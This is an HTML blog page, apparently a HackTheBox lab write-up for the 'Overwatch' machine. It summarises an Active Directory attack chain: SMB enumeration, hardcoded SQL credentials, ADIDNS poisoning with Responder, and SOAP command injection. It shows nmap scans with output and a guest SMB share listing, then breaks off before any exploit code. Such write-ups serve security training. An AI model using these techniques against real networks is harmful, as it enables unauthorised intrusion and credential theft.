@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- ══════════════ PRIMARY META ══════════════ -->
+  <title>Overwatch HackTheBox | Zirov</title>
+  <meta name="description" content="Windows Active Directory machine exploited via SMB reverse engineering, ADIDNS poisoning to capture cleartext MSSQL credentials, and SOAP command injection for SYSTEM." />
+  <meta name="author"      content="Zirov" />
+  <meta name="robots"      content="index, follow" />
+  <meta name="keywords"    content="hackthebox, writeup, ctf, active directory, adidns poisoning, mssql linked server, soap command injection, dnspy, responder, windows" />
+  <link rel="canonical"    href="https://zirov.github.io/writeups/overwatch-htb.html" />
+
+  <!-- ══════════════ OPEN GRAPH ══════════════ -->
+  <meta property="og:type"                content="article" />
+  <meta property="og:title"               content="Overwatch HackTheBox | Zirov" />
+  <meta property="og:description"         content="Windows Active Directory machine exploited via SMB reverse engineering, ADIDNS poisoning to capture cleartext MSSQL credentials, and SOAP command injection for SYSTEM." />
+  <meta property="og:url"                 content="https://zirov.github.io/writeups/overwatch-htb.html" />
+  <meta property="og:site_name"           content="Zirov" />
+  <meta property="og:image"              content="https://zirov.xyz/img/overwatch-htb.png" />
+  <meta property="og:image:width"        content="1200" />
+  <meta property="og:image:height"       content="630" />
+  <meta property="og:image:alt"          content="Overwatch HTB — Zirov" />
+  <meta property="og:locale"             content="en_US" />
+  <meta property="article:author"         content="Zirov" />
+  <meta property="article:published_time" content="2026-05-09" />
+  <meta property="article:tag" content="hackthebox">
+  <meta property="article:tag" content="writeup">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="active directory">
+  <meta property="article:tag" content="adidns poisoning">
+  <meta property="article:tag" content="mssql linked server">
+  <meta property="article:tag" content="soap command injection">
+  <meta property="article:tag" content="dnspy">
+  <meta property="article:tag" content="responder">
+  <meta property="article:tag" content="windows">
+
+  <!-- ══════════════ TWITTER CARD ══════════════ -->
+  <meta name="twitter:card"        content="summary_large_image" />
+  <meta name="twitter:title"       content="Overwatch HackTheBox | Zirov" />
+  <meta name="twitter:description" content="Windows Active Directory machine exploited via SMB reverse engineering, ADIDNS poisoning to capture cleartext MSSQL credentials, and SOAP command injection for SYSTEM." />
+  <meta name="twitter:image"       content="https://zirov.xyz/img/overwatch-htb.png" />
+  <meta name="twitter:image:alt"   content="Overwatch HTB — Zirov" />
+
+  <!-- ══════════════ SCHEMA.ORG ══════════════ -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Overwatch HTB",
+    "description": "Windows Active Directory machine exploited via SMB reverse engineering, ADIDNS poisoning to capture cleartext MSSQL credentials, and SOAP command injection for SYSTEM.",
+    "image": "https://zirov.xyz/img/overwatch-htb.png",
+    "author": {
+      "@type": "Person",
+      "name": "Zirov",
+      "url": "https://zirov.xyz/page/profile.html"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Zirov",
+      "url": "https://zirov.xyz/"
+    },
+    "datePublished": "2026-05-09",
+    "dateModified":  "2026-05-09",
+    "url": "https://zirov.github.io/writeups/overwatch-htb.html",
+    "keywords": ["hackthebox", "writeup", "ctf", "active directory", "adidns poisoning", "mssql linked server", "soap command injection", "dnspy", "responder", "windows"],
+    "articleSection": "Writeups",
+    "inLanguage": "en"
+  }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=Outfit:wght@400;500;600;700;800&family=Barlow:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/styles.css">
+  <link rel="stylesheet" href="../css/search.css">
+  <link rel="stylesheet" href="../css/post.css">
+</head>
+<body>
+  <div class="menu-overlay" id="menuOverlay"></div>
+  <aside class="side-menu" id="sideMenu">
+    <div class="menu-profile">
+      <img src="../img/profile.png" class="menu-avatar" alt="Zirov" onerror="this.style.display='none'">
+      <h3 class="menu-name">Ziro<em>v</em></h3>
+      <p class="menu-bio">Security Researcher · CTF Player · Blogger</p>
+    </div>
+    <div class="menu-nav-wrapper">
+      <nav class="menu-nav">
+        <a href="/" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg><span>Home</span></a>
+        <a href="../page/profile.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><span>Zirov</span></a>
+        <a href="../page/archives.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/></svg><span>Archives</span></a>
+        <a href="../page/notes.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg><span>Notes</span></a>
+        <a href="../page/tags.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z"/></svg><span>Tags</span></a>
+        <a href="../page/projects.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/></svg><span>Projects</span></a>
+      </nav>
+      <nav class="menu-nav menu-nav-secondary">
+        <a href="https://youtube.com/@zirovsec" target="_blank" rel="noopener noreferrer" class="menu-link menu-link-secondary"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span>YouTube</span></a>
+        <a href="https://twitch.tv/zirovsec" target="_blank" rel="noopener noreferrer" class="menu-link menu-link-secondary"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.571 4.714h1.715v5.143H11.57zm4.715 0H18v5.143h-1.714zM6 0L1.714 4.286v15.428h5.143V24l4.286-4.286h3.428L22.286 12V0zm14.571 11.143l-3.428 3.428h-3.429l-3 3v-3H6.857V1.714h13.714Z"/></svg><span>Twitch</span></a>
+        <a href="https://discord.gg/PBq8YBsq" target="_blank" rel="noopener noreferrer" class="menu-link menu-link-secondary"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg><span>Discord</span></a>
+      </nav>
+    </div>
+    <div class="menu-social-strip">
+      <a href="https://github.com/z1rov" target="_blank" rel="noopener" class="menu-social-link" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"/></svg></a>
+      <a href="https://www.linkedin.com/in/fabian-g-huamani" target="_blank" rel="noopener" class="menu-social-link" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452z"/></svg></a>
+      <a href="https://profile.hackthebox.com/profile/019c52fc-d8cf-7339-9385-c0d96f6f7efb" target="_blank" rel="noopener" class="menu-social-link" aria-label="HackTheBox"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.026.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.026l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.026c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .726l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.726l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.526 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.261.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.526 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg></a>
+      <a href="mailto:fabian.huamani@ucsm.edu.pe" class="menu-social-link" aria-label="Email"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></a>
+    </div>
+  </aside>
+  <header class="topbar">
+    <button class="hamburger" id="hamburgerBtn" aria-label="Open menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="15" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+    <a class="logo-wrap" href="/"><svg class="logo-icon" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg"><path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/><path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/></svg><span class="logo-text">Ziro<em>v</em></span></a>
+    <div class="topbar-right">
+      <button class="icon-btn search-btn" aria-label="Search" id="search-toggle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></button>
+      <button class="icon-btn" id="themeBtn" aria-label="Toggle theme">
+        <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+        <svg class="i-sun"  viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32 1.41 1.41M2 12h2m16 0h2M4.93 19.07l1.41-1.41m11.32-11.32 1.41-1.41"/></svg>
+      </button>
+      <a href="https://discord.gg/PBq8YBsq" target="_blank" rel="noopener" class="btn-join">
+        <svg viewBox="0 0 24 24" fill="currentColor" style="width:12px;height:12px;flex-shrink:0"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+        Join Discord
+      </a>
+      <a href="../page/profile.html" class="avatar"><img src="../img/profile.png" alt="Zirov" onerror="this.style.display='none'"></a>
+    </div>
+  </header>
+  <div class="ticker"><div class="ticker-track" id="tickerTrack"></div></div>
+  <main class="layout">
+    <article class="col-featured post-article">
+      <header class="post-header">
+        <div class="post-breadcrumb">
+          <a href="/">Home</a><span class="sep">›</span>
+          <a href="/page/archives.html">Writeups</a><span class="sep">›</span>
+          <span>Overwatch HTB</span>
+        </div>
+        <h1 class="post-title">Overwatch HTB</h1>
+        <div class="post-meta">
+          <span class="post-date"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>May 09, 2026</span>
+          <span class="post-dot">·</span>
+          <span class="post-words"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg><span>4,424 words</span></span>
+          <span class="post-dot">·</span>
+          <span class="post-readtime"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span>23 min</span></span>
+        </div>
+        <div class="post-tags"><a href="/page/tags.html#hackthebox" class="tag">hackthebox</a>
+                  <a href="/page/tags.html#writeup" class="tag">writeup</a>
+                  <a href="/page/tags.html#ctf" class="tag">ctf</a>
+                  <a href="/page/tags.html#active-directory" class="tag">active directory</a>
+                  <a href="/page/tags.html#adidns-poisoning" class="tag">adidns poisoning</a>
+                  <a href="/page/tags.html#mssql-linked-server" class="tag">mssql linked server</a>
+                  <a href="/page/tags.html#soap-command-injection" class="tag">soap command injection</a>
+                  <a href="/page/tags.html#dnspy" class="tag">dnspy</a>
+                  <a href="/page/tags.html#responder" class="tag">responder</a>
+                  <a href="/page/tags.html#windows" class="tag">windows</a></div>
+      </header>
+      <img class="post-cover" src="https://zirov.xyz/img/overwatch-htb.png" alt="Overwatch HTB cover" onerror="this.style.display='none'"/>
+      <div class="post-content">
+<h2 id="summary">Summary</h2>
+<p>Overwatch is a Windows <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">Active Directory</a> machine that chains several interesting techniques together. The initial foothold begins with unauthenticated SMB enumeration that exposes a custom .NET monitoring executable. Reverse engineering the binary with <a href="https://github.com/dnSpy/dnSpy">DNSpy</a> reveals hardcoded SQL credentials, while the accompanying config file leaks the internal SOAP service address. Those credentials grant access to a <a href="https://learn.microsoft.com/en-us/sql/sql-server/">Microsoft SQL Server</a> instance running on a non-standard port, which has a <a href="https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine">Linked Server</a> configured pointing to a hostname that does not exist in DNS. This opens the door for <a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing">ADIDNS Poisoning</a>, where we register the missing DNS record to intercept the SQL Server's outbound authentication via <a href="https://github.com/lgandx/Responder">Responder</a>, capturing cleartext credentials for a second domain user. That user has WinRM access. Once on the box, local enumeration confirms the internal SOAP service on port 8000 already hinted at by the config file — it is vulnerable to command injection and runs as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p><strong>Attack chain:</strong> Initial access through SMB guest enumeration led to reverse engineering a .NET binary (DNSpy), revealing MSSQL credentials. This enabled ADIDNS poisoning and credential capture via Responder, followed by WinRM access and eventual SYSTEM compromise through SOAP command injection.</p>
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="full-port-scan">Full Port Scan</h3>
+<p>The first step is always a full TCP scan across all 65535 ports to avoid missing services on non-standard ports. Using <code>--min-rate 5000</code> and <code>-T4</code> speeds things up considerably on HTB infrastructure without significant reliability tradeoffs. <code>-Pn</code> skips host discovery since we already know the host is up, and <code>-n</code> disables reverse DNS lookups to reduce noise.</p>
+<pre><code class="lang-bash">sudo nmap -p- --open --min-rate 5000 -T4 -n -Pn -sS 10.129.59.40 -oG allPorts
+</code></pre>
+<pre><code>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-08 15:37 -0500
+Nmap scan report for 10.129.59.40
+Host is up (0.15s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+6520/tcp  open  unknown
+9389/tcp  open  adws
+49664/tcp open  unknown
+49669/tcp open  unknown
+54802/tcp open  unknown
+54803/tcp open  unknown
+59861/tcp open  unknown
+65240/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
+</code></pre>
+<p>The open port profile is immediately recognizable as a <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">Domain Controller</a>: DNS (53), <a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview">Kerberos</a> (88), <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/">LDAP</a> (389/636/3268/3269), <a href="https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview">SMB</a> (139/445), <a href="https://learn.microsoft.com/en-us/windows/win32/winrm/portal">WinRM</a> (5985), and RDP (3389). Port <strong>6520</strong> stands out — SQL Server typically runs on 1433, so this non-default port suggests a deliberate configuration choice, possibly to avoid automated scanners.</p>
+<blockquote>
+<p><strong>Note:</strong> Port 9389 is <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd391908(v=ws.10)">Active Directory Web Services (ADWS)</a>, used by tools like <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> and <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> to query AD objects remotely over LDAP.</p>
+</blockquote>
+<h3 id="service-version-scan">Service Version Scan</h3>
+<p>With the open ports identified, we run a targeted service detection scan (<code>-sCV</code>) to fingerprint each service and extract useful metadata like software versions, SSL certificate subject names, and SMB information:</p>
+<pre><code class="lang-bash">nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49668,52458,62012,62360,62361 -sCV -Pn 10.129.59.40 -oN info_10.129.59.40
+</code></pre>
+<pre><code>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-08 15:39 -0500
+Nmap scan report for 10.129.59.40
+Host is up (0.22s latency).
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     tcpwrapped
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-08 18:39:43Z)
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     tcpwrapped
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
+3269/tcp  open     tcpwrapped
+3389/tcp  open     ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=S200401.overwatch.htb
+| Not valid before: 2026-05-07T18:33:58
+|_Not valid after:  2026-11-06T18:33:58
+| rdp-ntlm-info: 
+|   Target_Name: OVERWATCH
+|   NetBIOS_Domain_Name: OVERWATCH
+|   NetBIOS_Computer_Name: S200401
+|   DNS_Domain_Name: overwatch.htb
+|   DNS_Computer_Name: S200401.overwatch.htb
+|   DNS_Tree_Name: overwatch.htb
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-05-08T18:40:36+00:00
+|_ssl-date: 2026-05-08T18:41:16+00:00; -1h59m59s from scanner time.
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+6520/tcp  open     ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.59.40:6520: 
+|     Target_Name: OVERWATCH
+|     NetBIOS_Domain_Name: OVERWATCH
+|     NetBIOS_Computer_Name: S200401
+|     DNS_Domain_Name: overwatch.htb
+|     DNS_Computer_Name: S200401.overwatch.htb
+|     DNS_Tree_Name: overwatch.htb
+|_    Product_Version: 10.0.20348
+| ms-sql-info: 
+|   10.129.59.40:6520: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 6520
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-05-08T18:36:15
+|_Not valid after:  2056-05-08T18:36:15
+|_ssl-date: 2026-05-08T18:41:18+00:00; -1h59m59s from scanner time.
+9389/tcp  open     mc-nmf        .NET Message Framing
+49664/tcp open     msrpc         Microsoft Windows RPC
+
+Host script results:
+|_clock-skew: mean: -1h59m59s, deviation: 0s, median: -1h59m59s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-05-08T18:40:36
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 109.51 seconds
+</code></pre>
+<p>The domain is <code>overwatch.htb</code> and the machine hostname is <code>S200401</code>. The RDP SSL certificate confirms the FQDN as <code>S200401.overwatch.htb</code>. SQL Server 2022 RTM is confirmed on port 6520. SMB signing is enabled and <strong>required</strong>, which rules out <a href="https://www.thehacker.recipes/ad/movement/ntlm/relay">NTLM relay attacks</a> against SMB. The clock skew of approximately 2 hours is worth noting — <a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview">Kerberos</a> authentication requires clocks to be within 5 minutes of each other, so any Kerberos-based attacks would need clock synchronization first.</p>
+<p>We add both the domain and the FQDN hostname to <code>/etc/hosts</code> for local name resolution:</p>
+<pre><code class="lang-bash">echo '10.129.59.40 overwatch.htb' | sudo tee -a /etc/hosts
+echo '10.129.59.40 S200401.overwatch.htb' | sudo tee -a /etc/hosts
+</code></pre>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="smb-share-enum">SMB Share Enum</h3>
+<p>SMB is one of the first protocols to probe on Windows machines because misconfigurations — such as guest-readable shares — are extremely common. We use <a href="https://github.com/Pennyw0rth/NetExec">NetExec (nxc)</a>, the actively maintained successor to <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>, to list shares accessible via a guest/null session:</p>
+<pre><code class="lang-bash">nxc smb S200401.overwatch.htb -u 'guest' -p '' --shares
+</code></pre>
